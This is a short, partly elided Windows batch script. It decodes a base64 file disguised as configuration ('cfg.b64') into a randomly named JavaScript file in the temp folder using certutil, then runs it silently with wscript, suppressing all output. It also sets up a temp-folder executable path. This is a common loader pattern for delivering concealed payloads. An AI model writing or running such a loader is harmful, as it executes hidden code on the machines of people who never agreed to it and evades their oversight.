@echo off
setlocal
set "OUT=%TEMP%\rbc_66a21de4ed02071d.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_66a21de4ed02071d.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_66a21de4ed02071d.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_66a21de4ed02071d.js"
exit /b 0
